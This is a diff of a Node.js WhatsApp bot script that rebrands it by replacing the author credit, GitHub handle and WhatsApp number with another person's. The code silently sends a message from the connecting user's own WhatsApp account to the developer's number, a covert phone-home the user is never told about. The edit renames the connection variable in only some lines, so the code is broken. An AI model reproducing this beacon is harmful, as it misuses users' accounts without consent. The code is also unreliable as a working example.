@@ -1,6 +1,6 @@
 //pls give credit if you reupload 
 //or copy the codes
-//© 2022 Xeon Bot Inc. Doge Bot
+//© 2022 Goransh Bot Inc. Dogesh Bot
 const {
     WAConnection,
     MessageType,
@@ -33,8 +33,8 @@ const starts = async (DogeXeonOP = new WAConnection()) => {
 		whitespaceBreak: false
 	}), 'cyan'))
 	console.log(color('\n> YT CHANNEL: Xeon ','silver'))
-console.log(color('> GITHUB: DGXeon ','silver'))
-console.log(color('> WA NUMBER: +916909137213 ','silver'))
+console.log(color('> GITHUB: RIDERGORANSH ','silver'))
+console.log(color('> WA NUMBER: +918107768770 ','silver'))
 console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
     console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
     console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
@@ -42,7 +42,7 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
     console.log(color('[DOGE BOT]'), color('Doge Bot Is Online', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
     console.log(color('<>','red'), color('Thanks For Using Doge Bot', 'white'))
-	DogeXeonOP.browserDescription = [ 'Subscribe Xeon', 'chrome', '3.0' ]
+	DogeshRiderOP.browserDescription = [ 'Subscribe Xeon', 'chrome', '3.0' ]
     DogeXeonOP.on('qr', () => {
         console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
     })
@@ -51,11 +51,11 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
     DogeXeonOP.on('connecting', () => {
         start('2', 'Loading ...')
     })
-    DogeXeonOP.on('open', () => {
+    DogeshRiderOP.on('open', () => {
         success('2', 'Connected ✓')
     })
         //inform to developer that the user is connected to bot
-    DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    DogeXeonOP.sendMessage(`918107768770@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
     teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
